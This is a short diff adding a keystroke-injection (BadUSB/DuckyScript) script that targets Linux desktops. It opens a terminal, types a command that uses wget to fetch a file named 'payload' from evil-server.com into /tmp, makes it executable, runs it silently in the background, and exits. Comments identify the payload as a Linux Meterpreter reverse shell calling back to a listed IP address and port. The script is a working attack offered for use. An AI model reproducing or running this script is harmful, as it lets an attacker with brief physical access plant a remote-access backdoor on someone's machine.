@@ -1,0 +1,17 @@
+REM Open terminal, download file, execute it
+DEFAULT_DELAY 250
+DELAY 5000
+REM Linux x86 Meterpreter 188.166.16.150:4343
+REM Open a terminal
+REM For some reason, ALT F2 is not working for me.
+WINDOWS a
+DELAY 250
+STRING terminal
+DELAY 150
+ENTER
+REM Type the payload
+STRING cd /tmp; wget http://evil-server.com/payload;chmod +x payload;./payload > /dev/null 2>&1 &
+REM Run it
+ENTER
+STRING exit
+ENTER
